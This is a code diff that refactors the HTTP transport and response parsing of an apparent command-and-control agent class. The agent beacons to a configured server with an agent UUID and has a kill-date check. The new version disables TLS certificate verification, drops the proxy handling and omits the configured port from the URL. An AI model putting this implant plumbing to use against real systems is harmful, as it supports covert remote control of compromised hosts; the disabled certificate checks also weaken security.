@@ -39,9 +39,26 @@ class igider:
         This function assumes the server's response is prefixed with the agent's UUID.
         """
     def formatResponse(self, data):
-        decoded_data = data.decode('utf-8')
-        json_data = decoded_data.replace(self.agent_config["UUID"], "")
-        return json.loads(json_data)
+        try:
+            # Check if data is already a string (in case server sends plain text)
+            if isinstance(data, str):
+                decoded_data = data
+            else:
+                decoded_data = data.decode('utf-8')
+            json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
+            return json.loads(json_data)
+        except UnicodeDecodeError as e:
+            # Try alternative encoding (e.g., latin-1) or handle as binary
+            try:
+                decoded_data = data.decode('latin-1')
+                json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
+                return json.loads(json_data)
+            except Exception as e2:
+                return {}
+        except json.JSONDecodeError as e:
+            print(f"JSONDecodeError: {e}")
+            return {}
+
 
         """
         Formats a message, sends it to the server using a POST request, decrypts the response, and then formats it as a JSON object.
@@ -206,36 +223,21 @@ class igider:
         It also skips SSL certificate verification.
         """
     def makeRequest(self, data, method='GET'):
-        hdrs = {}
-        for header in self.agent_config["Headers"]:
-            hdrs[header] = self.agent_config["Headers"][header]
-        if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
-        else:
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
-        #CERTSKIP
-        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
-            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
-            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
-                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
-            else:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                opener = urllib.request.build_opener(proxy, handler)
-            urllib.request.install_opener(opener)
+        hdrs = self.agent_config["Headers"]
+        url = f"{self.agent_config['Server']}{self.agent_config['PostURI'] if method == 'POST' else self.agent_config['GetURI'] + '?' + self.agent_config['GetParam'] + '=' + data.decode()}"
+        req = urllib.request.Request(url, data if method == 'POST' else None, hdrs)
+        context = ssl._create_unverified_context()
         try:
-            with urllib.request.urlopen(req) as response:
-                out = base64.b64decode(response.read())
-                response.close()
+            with urllib.request.urlopen(req, context=context) as response:
+                raw_response = response.read()
+                # Try base64 decoding, fall back to raw if it fails
+                try:
+                    out = base64.b64decode(raw_response)
+                except Exception as e:
+                    out = raw_response
                 return out
-        except: return ""
+        except Exception as e:
+            return ""
 
         """
         Checks if the current date has passed the configured kill date for the agent.
